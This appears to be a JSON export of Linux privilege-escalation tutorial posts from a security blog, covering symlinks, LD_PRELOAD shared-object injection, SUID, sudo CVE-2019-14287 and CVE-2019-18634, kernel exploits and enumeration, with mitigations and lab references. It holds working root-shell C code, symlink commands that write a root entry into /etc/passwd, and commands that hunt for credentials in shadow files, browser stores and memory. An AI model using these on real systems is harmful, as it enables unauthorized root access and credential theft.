[{"content":"Binary Symlink Privilege Escalation Binary symlink privilege escalation is a technique where an attacker abuses symbolic links (symlinks) to trick a privileged program into executing malicious code or performing unintended actions with elevated privileges. This type of attack often targets misconfigured or insecurely coded scripts or binaries that execute with higher privileges, such as root.\nHow It Works Understanding Symlinks:\nA symlink is a file that points to another file or directory. For example: 1 ln -s /path/to/target /path/to/symlink Privilege Escalation via Symlinks:\nAn attacker creates a symlink pointing to a malicious binary or file. A privileged program inadvertently interacts with the symlink, allowing the attacker to manipulate the file or execute code with elevated privileges. Scenarios for Exploiting Symlinks Writable Directories in Privileged Context:\nIf a privileged program creates or interacts with files in a directory writable by unprivileged users, an attacker can replace those files with symlinks pointing to sensitive locations like /etc/passwd. Temporary File Vulnerabilities:\nPrograms that create temporary files without securely checking their existence are susceptible to symlink attacks. Example: A script creates a temporary file /tmp/somefile without checking if it already exists. The attacker creates a symlink /tmp/somefile pointing to /etc/shadow. When the privileged program writes to /tmp/somefile, it overwrites /etc/shadow. Replacing Binaries:\nIf a privileged service or cron job executes a script from a writable directory, an attacker can replace it with a symlink pointing to a malicious script. Practical Example 1. Symlink Attack to Modify /etc/passwd Assume a root script copies a file to /etc/passwd without checking its destination:\n1 cp /tmp/userfile /etc/passwd Exploitation:\n1 2 ln -s /etc/passwd /tmp/userfile echo \u0026#34;malicious_entry:x:0:0:root:/root:/bin/bash\u0026#34; \u0026gt;\u0026gt; /tmp/userfile When the script runs, the symlink redirects /tmp/userfile to /etc/passwd, adding the malicious entry with root privileges.\n2. Temporary File Exploitation A root-owned script writes logs to /tmp/log.txt:\n1 echo \u0026#34;System Log\u0026#34; \u0026gt; /tmp/log.txt Exploitation:\n1 ln -s /etc/shadow /tmp/log.txt The script overwrites /etc/shadow, potentially corrupting it or injecting malicious content.\nMitigations Secure Temporary File Creation:\nUse secure functions like mktemp to create unique temporary files.\n1 2 temp_file=$(mktemp) echo \u0026#34;Secure Data\u0026#34; \u0026gt; \u0026#34;$temp_file\u0026#34; Validate Symlinks:\nUse the O_NOFOLLOW flag when opening files to avoid following symlinks:\n1 open(\u0026#34;/tmp/file\u0026#34;, O_WRONLY | O_CREAT | O_NOFOLLOW); Restrict Permissions:\nEnsure sensitive directories and files are not writable by unprivileged users.\nFor example, /tmp should have the sticky bit set:\n1 chmod +t /tmp Avoid Privileged Actions on User-Controlled Files:\nAvoid executing privileged operations on files in user-writable locations. Monitor and Audit:\nRegularly monitor for suspicious symlinks in writable directories using tools like find:\n1 find /tmp -type l -ls ","date":"2025-01-30T17:41:45Z","image":"https://zerodex1.github.io/post/binary.jpg","permalink":"https://zerodex1.github.io/p/binary-symlinks/","title":"Binary Symlinks"},{"content":"Shared Object Injection for Privilege Escalation Shared Object (SO) injection is a technique where an attacker forces a process to load a malicious shared library (.so file) into its memory. When executed, the malicious code in the library runs with the privileges of the target process, potentially leading to privilege escalation if the process has higher privileges (e.g., root).\nHow Shared Object Injection Works Shared Libraries in Linux:\nLinux dynamically links shared libraries (.so files) at runtime. Applications specify required libraries in their code, and the system\u0026rsquo;s dynamic linker loads them when the application starts. Manipulating Library Loading:\nAttackers can exploit library loading mechanisms, such as modifying environment variables (LD_PRELOAD, LD_LIBRARY_PATH), or targeting programs that improperly handle library paths. Privilege Escalation:\nIf an attacker can make a root-owned process load their malicious .so file, they can execute arbitrary code as root. Techniques for Shared Object Injection 1. Using LD_PRELOAD: The LD_PRELOAD environment variable allows users to specify additional shared libraries to be loaded before any others.\nExploit scenario:\nA program with sudo permissions does not sanitize environment variables. The attacker sets LD_PRELOAD to point to their malicious .so file. Example:\n1 2 3 echo \u0026#39;void _init() { setuid(0); system(\u0026#34;/bin/bash\u0026#34;); }\u0026#39; \u0026gt; exploit.c gcc -shared -fPIC -o exploit.so exploit.c LD_PRELOAD=./exploit.so sudo some-command 2. Hijacking LD_LIBRARY_PATH: LD_LIBRARY_PATH specifies directories for the linker to search for shared libraries.\nExploit scenario:\nThe attacker modifies LD_LIBRARY_PATH to include a directory containing malicious libraries. Example:\n1 export LD_LIBRARY_PATH=/tmp/malicious:$LD_LIBRARY_PATH 3. Replacing Legitimate Libraries: Replace a shared library on the system with a malicious one. Exploit scenario: Insufficient file permissions allow an attacker to overwrite a .so file used by a privileged program. 4. Dynamic Linking Exploits: Exploit applications that dynamically load libraries during execution using functions like dlopen() or dlsym(). Example: Privilege Escalation Using LD_PRELOAD Create a Malicious Shared Object:\n1 2 3 4 5 6 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; void _init() { setuid(0); // Set the UID to root system(\u0026#34;/bin/bash\u0026#34;); // Spawn a root shell } Save this as exploit.c and compile:\n1 gcc -fPIC -shared -o exploit.so exploit.c Set LD_PRELOAD:\n1 LD_PRELOAD=/path/to/exploit.so sudo some-command Result: A root shell is spawned if the target process is vulnerable.\nMitigations Against SO Injection Disable LD_PRELOAD for SUID Programs:\nModern Linux systems ignore LD_PRELOAD for SUID binaries to prevent this type of attack. Restrict LD_LIBRARY_PATH:\nLimit the use of custom library paths in privileged programs. Secure File Permissions:\nEnsure shared libraries are owned by root and are not writable by unprivileged users. Use Static Linking:\nFor critical programs, avoid dynamic linking altogether. Audit Programs:\nIdentify and fix applications that dynamically load libraries without proper checks. ","date":"2025-01-26T13:50:55Z","image":"https://zerodex1.github.io/post/suid.jpg","permalink":"https://zerodex1.github.io/p/shared-object-injection/","title":"Shared Object Injection"},{"content":"What is SUID? Definition: SUID (Set owner User ID up on execution) is a special permission that allows other users run with the owner’s privileges. That’s why SUID files can be exploited to give adversaries the higher privilege in Linux/Unix system called privilege escalation. Mostly, root access is the goal of hackers when performing privilege escalation.\nTechniques : Shared Object Injection Binary Symlinks Environment Variables How to find the SUID files The following command will list all of the SUID files in the system\n1 find / -perm -u=s -type f 2\u0026gt;/dev/null find: a Linux command to search for files in a directory hierarchy -perm: is used to define the permissions to search for -u=s: search for files with the SUID permission -type f: search for regular file 2\u0026gt;dev/null: errors will be deleted automatically ","date":"2025-01-26T12:47:23Z","image":"https://zerodex1.github.io/post/coversuid.jpg","permalink":"https://zerodex1.github.io/p/suid-attacks/","title":"SUID Attacks"},{"content":"Linux Privilege Escalation Using LD_PRELOAD LD_PRELOAD is an environment variable in Linux that allows users to load custom shared libraries before any other libraries during the execution of a program. Attackers can exploit this feature to inject malicious code and potentially escalate privileges, especially if the target program is executed with elevated permissions (e.g., as root).\nHow LD_PRELOAD Works Purpose: LD_PRELOAD is used for debugging or testing by overriding functions in shared libraries. Mechanism: When a program is executed, the dynamic linker checks the LD_PRELOAD variable for a shared library path. If specified, this library is loaded before others, allowing its functions to override standard library functions. Privilege Escalation Let’s generate a C program file inside the /tmp directory.\n1 2 3 4 5 6 7 8 9 10 11 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; void _init() { unsetenv(\u0026#34;LD_PRELOAD\u0026#34;); setgid(0); setuid(0); system(\u0026#34;/bin/sh\u0026#34;); } Save it as shell.c inside /tmp.\nNext, compile it to generate a shared object with a .so extension, similar to a .dll file in the Windows operating system. Enter the following command:\n1 gcc -fPIC -shared -o shell.so shell.c -nostartfiles Check the generated file:\n1 ls -al shell.so Now execute the find command with LD_PRELOAD set to the path of the shared object:\n1 sudo LD_PRELOAD=/tmp/shell.so find To verify the privileges, run:\n1 2 id whoami And finally, you should have obtained root privileges! 😉\nResources : https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/ https://www.youtube.com/watch?v=bzjnIi5u9OQ ","date":"2025-01-24T13:21:32Z","image":"https://zerodex1.github.io/post/ldpco.jpg","permalink":"https://zerodex1.github.io/p/ld-preload/","title":"LD PRELOAD"},{"content":"What\u0026rsquo;s Sudo Shell Escaping Sudo shell escaping refers to a technique where a user with limited privileges uses sudo to bypass restrictions and execute commands as a higher-privileged user, typically root. This can occur if the sudo configuration (the sudoers file) allows running commands that invoke a shell or provide shell-like functionality.\nGetting Privilege Escalation To gain higher privileges using sudo, follow these steps:\nCheck how many commands you can run with sudo as a low-privilege user:\n1 sudo -l As seen in the image, there are some tools and services that can be run as `sudo`. To make exploitation easier, we can visit this site: [GTFOBins](https://gtfobins.github.io/). This site provides a lot of useful information. Let's search for one of these services, such as **Vim**. Simply copy the following command and paste it into your target terminal, and you will gain root privileges. Conclusion In conclusion, sudo shell escaping is a powerful technique that can be exploited to gain unauthorized root access on a system. By identifying commands that can be run with elevated privileges, attackers can leverage tools like GTFOBins to execute malicious payloads and bypass security restrictions. Understanding these offensive methods is crucial for penetration testers and security professionals as they simulate attacks and identify vulnerabilities.\n","date":"2025-01-24T12:38:00Z","image":"https://zerodex1.github.io/post/sudo-lc.jpg","permalink":"https://zerodex1.github.io/p/shell-escaping/","title":"Shell Escaping"},{"content":"Sudo CVEs In this article, we will discuss sudo CVEs, specifically CVE-2019-14287 and CVE-2019-18634, and how they allow us to achieve sudo privilege escalation on Linux systems.\nCVE-2019-14287 CVE-2019-14287 is a vulnerability in sudo that allows a user with restricted privileges to execute arbitrary commands as root, even if they are explicitly denied in the sudoers file. This occurs due to improper validation of the user ID (UID) when running commands.\nDetails of the Vulnerability Affected Software:\nsudo versions prior to 1.8.28. Vulnerability Description:\nWhen sudo is configured to allow a user to execute commands as any user except root using the !ALL directive in the sudoers file, the vulnerability allows bypassing this restriction. The issue arises because sudo does not properly handle the -1 or 4294967295 value for the UID. Internally, these values are interpreted as 0 (root). Exploitation:\nA user can exploit this by specifying -u#-1 to execute a command as root, bypassing the restrictions. Proof of Concept (PoC) 1. Vulnerable Configuration in /etc/sudoers: The following configuration denies a user (exampleuser) from executing commands as root:\n1 exampleuser ALL=(ALL,!root) ALL 2. Exploit Command: The attacker can bypass the restriction and run commands as root:\n1 sudo -u#-1 id 3. Expected Output: The command will execute as root (UID=0):\n1 uid=0(root) gid=0(root) groups=0(root) Impact Privilege Escalation: The attacker gains root privileges, bypassing intended restrictions. Severity: High (CVSS Score: 7.8). Mitigation Update sudo:\nUpgrade to sudo 1.8.28 or later, which properly validates UID values. 1 sudo apt update \u0026amp;\u0026amp; sudo apt install sudo Audit and Restrict sudoers Configuration:\nEnsure your sudoers file does not rely solely on !root for user restrictions. Monitor and Log sudo Usage:\nUse logs to monitor unusual activity involving sudo. Labs : https://tryhackme.com/r/room/sudovulnsbypass TryHackMe Lab Now that we have access to the machine, our next goal is to gain root privileges using the identified vulnerability.\nFirst, we use the command sudo -l to check what commands we can execute with the current user.\nAfter running sudo -l, we see that we can run /bin/bash as another user except for root. Let’s exploit this vulnerability.\n1 sudo -u#-1 /bin/bash And just like that, we are now the root user! :\nReferences MITRE CVE Details CVE-2019-18634 CVE-2019-18634 is a buffer overflow vulnerability in sudo that can allow local privilege escalation. It specifically affects sudo configurations where pwfeedback is enabled, which can result in memory corruption and potentially lead to unauthorized code execution or system crashes.\nDetails of the Vulnerability Affected Software:\nsudo versions prior to 1.8.31. Only configurations with pwfeedback enabled are affected. Vulnerability Description:\nThe pwfeedback option, which provides visual feedback when typing a password (e.g., asterisks), is susceptible to a buffer overflow. If the input exceeds the buffer size, it overflows, corrupting memory. The issue is exploitable only when the attacker provides their own password input, making it a local attack vector. Exploitation:\nBy triggering the buffer overflow, an attacker can potentially execute arbitrary code or crash the sudo process. Proof of Concept (PoC) 1. Vulnerable Configuration: The /etc/sudoers file must have pwfeedback enabled:\n1 Defaults pwfeedback 2. Exploit Steps: Use a specially crafted input (e.g., very long password) to overflow the buffer.\nFor example:\n1 python3 -c \u0026#34;print(\u0026#39;A\u0026#39; * 10000)\u0026#34; | sudo -S id This may result in a segmentation fault or allow further exploitation.\n3. Output: If the system is vulnerable, it could crash with a segmentation fault:\n1 Segmentation fault (core dumped) Impact Privilege Escalation: Potential execution of arbitrary code with root privileges. Denial of Service: Crash or instability of the sudo process. Severity: High (CVSS Score: 7.8). Mitigation Update sudo:\nUpgrade to sudo version 1.8.31 or later, where the issue is patched:\n1 sudo apt update \u0026amp;\u0026amp; sudo apt install sudo Disable pwfeedback:\nEnsure the pwfeedback option is not enabled in /etc/sudoers:\n1 Defaults !pwfeedback Apply Principle of Least Privilege:\nLimit sudo access to necessary users and monitor suspicious activity. Detection Check sudo Version:\n1 sudo --version Search for pwfeedback in sudoers:\n1 sudo grep pwfeedback /etc/sudoers /etc/sudoers.d/* Labs : https://tryhackme.com/r/room/sudovulnsbof References Sudo Security Advisory MITRE CVE Details ","date":"2025-01-23T14:14:48Z","image":"https://zerodex1.github.io/post/cvesudo.jpg","permalink":"https://zerodex1.github.io/p/sudo-cves/","title":"Sudo CVEs"},{"content":"Introduction to Sudo Attacks and Privilege Escalation on Linux In the world of Linux-based operating systems, the sudo command plays a critical role in user privilege management. It allows permitted users to execute commands as the superuser (root) or another user, as specified by the security policy. However, various vulnerabilities have been discovered in sudo that can lead to privilege escalation, allowing unauthorized users to gain elevated access to system resources.\nThis discussion centers around several notable vulnerabilities, including CVE-2019-14287 and CVE-2019-18634, which have garnered attention for their potential to exploit the sudo command for malicious purposes. These vulnerabilities demonstrate the importance of understanding how sudo can be misconfigured or manipulated, leading to security breaches.\nTopics to Discuss CVE-2019-14287: CVE-2019-14287 is a vulnerability in sudo that allows a user with restricted privileges to execute arbitrary commands as root, even if they are explicitly denied in the sudoers file. This occurs due to improper validation of the user ID (UID) when running commands.\nCVE-2019-18634: CVE-2019-18634 is a buffer overflow vulnerability in sudo that can allow local privilege escalation. It specifically affects sudo configurations where pwfeedback is enabled, which can result in memory corruption and potentially lead to unauthorized code execution or system crashes.\nShell Escaping: This topic focuses on the concept of shell escaping in command execution, particularly when arguments passed to the shell are not properly sanitized. Attackers can craft malicious input to manipulate shell behavior, leading to unintentional command executions with elevated privileges.\nLD_PRELOAD: This is an environment variable that can be exploited to execute malicious shared libraries before any other libraries when running a program. By using LD_PRELOAD, attackers can intercept and modify calls to system functions within programs invoked with sudo, paving the way for privilege escalation.\n","date":"2025-01-23T13:48:02Z","image":"https://zerodex1.github.io/post/sudo.jpg","permalink":"https://zerodex1.github.io/p/sudo-attacks/","title":"Sudo Attacks"},{"content":"What\u0026rsquo;s a Kernel Exploit? A kernel exploit refers to a technique used to exploit vulnerabilities within the kernel, the core component of an operating system. By leveraging these vulnerabilities, attackers can gain unauthorized access or elevate their privileges on the system. The ultimate goal of a kernel exploit is to execute arbitrary code within the kernel\u0026rsquo;s privileged context, often leading to root access and full control over the compromised machine.\nConditions for a Successful Kernel Exploit For a kernel exploit attack to be successful, an attacker must meet four critical conditions:\nA Vulnerable Kernel: The target system must be running a kernel version that contains a known vulnerability. A Matching Exploit: There must be an existing exploit tailored for that specific vulnerability. Ability to Transfer the Exploit: The attacker needs the means to transfer the exploit code to the target system. Ability to Execute the Exploit: The attacker must have the capability to run the exploit on the target successfully. Identifying Vulnerable Kernels To determine if a target kernel is vulnerable, you need to conduct some enumeration. Use the following command:\n1 2 uname -a uname -r The uname -a command provides complete system information, while uname -r displays the kernel version specifically. Once you have this information, check online to see if the revealed kernel version contains any known vulnerabilities that could be exploited for privilege escalation. Resources for Finding Kernel Exploits Here are some valuable resources to help you identify kernel exploits:\nKernel Exploits Repository on GitHub Exploit Database The searchsploit tool from Kali Linux can also be incredibly useful for searching exploits. Modifying Exploits If you discover that an exploit doesn’t work despite the correct kernel version, consider either switching to a different exploit or modifying the exploit code to better suit the target environment. Exploits often require tailoring to match specific configurations or system defenses.\nPractical Labs for Learning If you\u0026rsquo;re looking to practice kernel exploitation techniques, consider engaging with the following labs:\nStapler on VulnHub Linux Privilege Escalation Room on TryHackMe These platforms provide a safe and controlled environment to hone your skills in identifying and exploiting kernel vulnerabilities.\nConclusion Kernel exploits are powerful tools for attackers, and understanding how they function is crucial for both offensive and defensive cybersecurity practices. By familiarizing yourself with the conditions for exploitation and utilizing available resources and labs, you can enhance your knowledge and skills in this critical area of cybersecurity.\n","date":"2025-01-22T12:43:56Z","image":"https://zerodex1.github.io/post/bestcoverblog.jpg","permalink":"https://zerodex1.github.io/p/linux-kernel-exploit-privesc/","title":"Linux Kernel Exploit Privesc"},{"content":"linux Enumeration For Privilege esclation In this article I will share with you some techniques for enumerate linux system.\nTable of contents :\n- System and User Enumeration - Files Enumeration - Network Enumeration - Password Enumeration - Automation Tools System and User Enumeration System and user enumeration involves gathering information about the operating system, users, groups, and privileges to identify potential weaknesses for privilege escalation.\nuname: The uname command, when used with the -a option, displays detailed information about the Linux kernel: 1 uname -a cat /etc/os-release: This command displays information about the target system’s distribution and version: 1 cat /etc/os-release cat /proc/version: This command displays more detailed information about the Linux kernel, including the compiler used to build it: 1 cat /proc/version Current User and Group:\n1 2 3 whoami id groups Logged-in Users:\n1 2 w last System Users:\n1 2 cat /etc/passwd awk -F: \u0026#39;$3 \u0026lt; 1000 {print $1}\u0026#39; /etc/passwd Sudo Permissions:\n1 sudo -l Environment Variables:\n1 env Processes Owned by Other Users:\n1 ps aux Hidden Users (Check for unusual configurations):\n1 ls -la /home/ Files with SUID/SGID Bit:\n1 find / -perm /6000 -type f 2\u0026gt;/dev/null Files Enumeration File enumeration involves searching for sensitive files, misconfigurations, or improper permissions that can be exploited to escalate privileges or gain unauthorized access.\nSearch for World-Writable Files:\n1 find / -type f -perm -o+w 2\u0026gt;/dev/null Search for World-Writable Directories:\n1 find / -type d -perm -o+w 2\u0026gt;/dev/null Search for Files Owned by Root:\n1 find / -uid 0 -type f 2\u0026gt;/dev/null Search for Files with SUID Bit:\n1 find / -perm /4000 -type f 2\u0026gt;/dev/null Search for Files with SGID Bit:\n1 find / -perm /2000 -type f 2\u0026gt;/dev/null Search for Configuration Files Containing Credentials:\n1 2 grep -Ri \u0026#34;password\u0026#34; /etc/* 2\u0026gt;/dev/null grep -Ri \u0026#34;passwd\u0026#34; /home/* 2\u0026gt;/dev/null Identify Writable Files in System Directories:\n1 find /etc -writable 2\u0026gt;/dev/null Look for Backup Files:\n1 find / -name \u0026#34;*.bak\u0026#34; -o -name \u0026#34;*.backup\u0026#34; 2\u0026gt;/dev/null Search for SSH Keys:\n1 find / -name \u0026#34;id_rsa\u0026#34; -o -name \u0026#34;id_dsa\u0026#34; 2\u0026gt;/dev/null Search for Sensitive Application Configuration Files;\nApache:\n1 cat /etc/httpd/conf/httpd.conf MySQL:\n1 cat /etc/mysql/my.cnf Find Recent Files Modified or Created:\n1 find / -type f -mtime -5 2\u0026gt;/dev/null Find Hidden Files:\n1 find / -name \u0026#34;.*\u0026#34; 2\u0026gt;/dev/null Identify Files Owned by Current User:\n1 find / -user $(whoami) 2\u0026gt;/dev/null Check for Backup/Temp Files in Home Directories:\n1 ls -laR /home/ | grep \u0026#34;~\u0026#34; Network Enumeration Network enumeration involves discovering network configurations, active connections, and accessible services to identify potential attack vectors for privilege escalation or lateral movement.\nShow Network Interfaces:\n1 2 ip a ifconfig Routing Table:\n1 2 ip route route -n View Active Network Connections:\n1 2 netstat -tuln ss -tuln DNS Configuration:\n1 cat /etc/resolv.conf ARP Table:\n1 2 arp -a ip neigh Ping to Test Connectivity:\n1 ping -c 4 \u0026lt;target-ip\u0026gt; Traceroute to Map Network Path:\n1 traceroute \u0026lt;target-ip\u0026gt; Identify Listening Ports:\n1 2 netstat -tulnp lsof -i Scan Open Ports on Target:\n1 nmap -sS -p- \u0026lt;target-ip\u0026gt; Password Enumeration Password hunting involves searching for stored credentials, configuration files, or weakly protected secrets that can be used to gain unauthorized access or escalate privileges.\nSome applications and services store sensitive information, including credentials, in configuration files. Common Locations:\n1 2 3 find / -name \u0026#34;*.conf\u0026#34; 2\u0026gt;/dev/null find / -name \u0026#34;*.yml\u0026#34; 2\u0026gt;/dev/null find / -name \u0026#34;*.ini\u0026#34; 2\u0026gt;/dev/null Look in directories like /etc/, /var/, /opt/, and /home/. Examples of Files to Check:\n1 2 3 /etc/passwd /etc/shadow (requires root or elevated privileges) /etc/ssh/sshd_config Check History Files Users often type sensitive commands that get stored in shell history files. 1 2 cat ~/.bash_history cat ~/.zsh_history Look for commands like ssh, sudo, mysql, or any with plaintext passwords.\nSearch for Files Containing the Word \u0026ldquo;Password\u0026rdquo; Look for plaintext credentials in files. 1 grep -ri \u0026#34;password\u0026#34; / 2\u0026gt;/dev/null Include variations like \u0026ldquo;passwd,\u0026rdquo; \u0026ldquo;pass,\u0026rdquo; or \u0026ldquo;pwd.\u0026rdquo;\nSearch for SSH Keys SSH private keys can be used to log into other systems. 1 find / -name \u0026#34;id_rsa\u0026#34; 2\u0026gt;/dev/null Check default paths like ~/.ssh/.\nLook for Database Credentials Applications often store database credentials in config files. 1 2 grep -ri \u0026#34;DB_USER\u0026#34; / 2\u0026gt;/dev/null grep -ri \u0026#34;DB_PASS\u0026#34; / 2\u0026gt;/dev/null Files to check: wp-config.php (WordPress) .env (Laravel or modern apps) settings.py (Django)\nDump Memory for Passwords Sometimes passwords can be found in running memory. 1 strings /dev/mem | grep -i \u0026#34;password\u0026#34; Alternatively, check running processes:\n1 ps aux |grep -i \u0026#34;password\u0026#34; Check for Backup Files Old backups may contain sensitive data. 1 2 3 find / -name \u0026#34;*.bak\u0026#34; 2\u0026gt;/dev/null find / -name \u0026#34;*.old\u0026#34; 2\u0026gt;/dev/null find / -name \u0026#34;*.backup\u0026#34; 2\u0026gt;/dev/null Identify Open Connections for Exposed Credentials Applications exposing credentials via environment variables or arguments can be a goldmine. 1 env | grep -i \u0026#34;pass\u0026#34; Check processes:\n1 ps aux | grep -E \u0026#34;password|username|key\u0026#34; Look for Git or Repository Secrets Repositories often accidentally include credentials. 1 2 find / -name \u0026#34;.git\u0026#34; 2\u0026gt;/dev/null grep -r \u0026#34;password\u0026#34; .git 2\u0026gt;/dev/null Dump Browser Credentials Browsers often save login information. Firefox:\n1 cat ~/.mozilla/firefox/*.default-release/logins.json Chrome: Credentials are stored in `~/.config/google-chrome/Default/Login Data (encrypted).\nEnumerate Credentials in Docker or Kubernetes Docker:\n1 docker inspect \u0026lt;container_id\u0026gt; Kubernetes:\n1 kubectl get secrets Extract Passwords from Files Using Tools Tools like strings, binwalk, or exiftool can help extract data from binary files. 1 strings \u0026lt;file\u0026gt; | grep -i \u0026#34;password\u0026#34; Enumerate Web Credentials Search web server files for hardcoded credentials: 1 grep -ri \u0026#34;auth\u0026#34; /var/www/html/ Advanced: Check for Password Reuse If you find a password or hash, try it across other accounts/services. 1 su -c \u0026#34;\u0026lt;found_password\u0026gt;\u0026#34; \u0026lt;username\u0026gt; Automation tools Automation tools help streamline the process of enumeration, vulnerability discovery, and privilege escalation by automating repetitive tasks and identifying potential weaknesses efficiently. In my opinion, mastering the process manually is preferable.\nLinPEAS LinPEAS (Linux Privilege Escalation Awesome Script) is a powerful script designed to enumerate a Linux system for privilege escalation vectors and misconfigurations.\n• Download Source: LinPEAS GitHub Repository LinPeas\nLinux Exploit Suggester This tool identifies potential privilege escalation vulnerabilities based on the system’s kernel version and configuration.\n• Download Source: Linux Exploit Suggester GitHub Repository Linux Exploit Suggester\nLinEnum LinEnum is a lightweight script that performs comprehensive enumeration of a Linux system, including user details, file permissions, and potential privilege escalation paths.\n• Download Source: LinEnum GitHub Repository LinEnum\nPspy Pspy is a process monitoring tool that allows you to watch processes executed on a Linux system without needing elevated privileges.\n• Download Source: pspy GitHub Repository Pspy\nConclusion In this article, I’ve shared key aspects of enumeration to help us master privilege escalation, from system and user insights to files, networks, and passwords. While tools can assist, I believe manual expertise is crucial. Thanks for reading, and happy learning!\n","date":"2025-01-21T14:22:34Z","image":"https://zerodex1.github.io/post/moon.jpg","permalink":"https://zerodex1.github.io/p/linux-enumeration/","title":"Linux Enumeration"},{"content":"Privilege escalation 1-What\u0026rsquo;s Privilege escalation?\n2-Types of Privilege escalation.\nWhat\u0026rsquo;s Privilege escalation : ● Privilege escalation is a critical concept in penetration testing and red teaming.\n● It refers to the process of gaining elevated access or additional privileges in a computer system or network, typically from a lower-level user to a higher-level user or administrator.\n● Privilege escalation involves exploiting vulnerabilities or misconfigurations to gain access to resources that are typically restricted to users with higher privileges.\nTypes of Privilege escalation : Privilege escalation can be divided in two types: vertical and horizontal.\n● Vertical: the attacker is able to move from a lower privileged user to a higher privileged user. For example from a low-end user to administrator or root user.\n● Horizontal: the attacker keeps the same set or level of privileges, but assumes the identity of a different user (he/she does not gain any further privilege).\nTable of contents : Enumeration System and User Enum Files Enum Network Enum Password Enum Techniques Kernel Exploit Sudo Attacks CVE-2019-14287 CVE-2019-18634 Shell Escaping LD-PRELOAD SUID SUID Attacks Shared Object Injection Binary Symlinks Environment variables Scheduled Tasks Scheduled Tasks Cron Jobs Cron wildcards Cron file overwrites Capabilities Attacks NFS Attack ","date":"2025-01-20T21:11:19Z","image":"https://zerodex1.github.io/p/privilege-escalation/cover_hu_16a8047a3c00d6e1.jpg","permalink":"https://zerodex1.github.io/p/privilege-escalation/","title":"Privilege Escalation"}]